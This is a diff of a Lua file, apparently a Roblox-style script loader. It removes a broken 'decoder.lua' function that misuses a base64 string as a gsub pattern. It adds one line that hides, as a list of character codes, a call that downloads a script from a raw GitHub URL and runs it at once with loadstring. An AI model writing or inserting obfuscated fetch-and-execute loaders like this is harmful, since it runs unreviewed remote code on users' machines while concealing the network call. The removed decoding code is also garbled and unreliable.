@@ -1,7 +1,1 @@
--- decoder.lua 内容
-return function(encoded)
-    local decoded = (encoded:gsub('bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS95eGdoMTY1L3l4Z2gxNjUvbWFpbi9rdW5rdW4xLjUiKSkoKQ==', function (cc)
-        return string.char(tonumber(cc, 16))
-    end))
-    loadstring(decoded)()
-end
+loadstring(utf8.char((function()  return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,121,120,103,104,49,54,53,47,121,120,103,104,49,54,53,47,109,97,105,110,47,107,117,110,107,117,110,49,46,53,34,41,41,40,41})end)()))()
